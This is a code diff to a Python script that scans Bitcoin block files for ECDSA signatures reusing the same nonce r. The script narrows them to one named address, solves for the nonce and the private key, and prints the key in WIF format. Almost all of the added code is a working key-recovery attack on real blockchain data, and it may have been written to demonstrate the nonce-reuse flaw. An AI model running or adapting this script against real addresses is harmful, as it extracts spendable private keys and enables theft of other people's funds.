@@ -27,10 +27,17 @@ def opcode_data(script):
         opcodes.append(data)
     return opcodes
 
+import collections
+r_values = collections.defaultdict(list)
+
 for filename in glob.glob("*.bin"):
     block = Block.parse(open(filename, "rb"))
     for tx in block.txs:
         for tx_in_idx, tx_in in enumerate(tx.txs_in):
+
+            if tx_in.bitcoin_address() != "1G4TqNcKTRRuQ3brQSv85Fohf3jQiaGAbL":
+                continue
+
             if tx.is_coinbase(): continue
             tx.unspents_from_db(tx_db, ignore_missing=True)
             if not tx.is_signature_ok(tx_in_idx): continue
@@ -55,10 +62,37 @@ for filename in glob.glob("*.bin"):
             r, s = sig_pair
             x, y = public_pair
 
-            print("Address:", tx_in.bitcoin_address())
-            print("r:", r)
-            print("s:", s)
-            print("x:", x)
-            print("y:", y)
-            print("h:", signature_hash)
+            # print("Address:", tx_in.bitcoin_address())
+            # print("r:", r)
+            # print("s:", s)
+            # print("x:", x)
+            # print("y:", y)
+            # print("h:", signature_hash)
             # print("Verifies:", secp256k1_generator.verify(public_pair, signature_hash, sig_pair))
+
+            r_values[r].append((tx_in.bitcoin_address(), r, s, x, y, signature_hash))
+
+N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+from modinv import modinv # pycoin.ecdsa.secp256k1
+
+for r in r_values:
+    if len(r_values[r]) == 2:
+        addr, r, s1, x, y, z1 = r_values[r][0]
+        addr, r, s2, x, y, z2 = r_values[r][1]
+
+        k = (z1 - z2) % N
+        k = k * modinv((s1 - s2) % N, N)
+        k = k % N
+        print(k)
+
+        # curve.mult(k, G).x == r
+
+        d = (s1 * k - z1) % N
+        d = d * modinv(r, N)
+        d = d % N
+        print(d)
+
+        print(addr)
+        print(secret_exponent_to_wif(d, compressed=False))
+
+# @FiloSottile
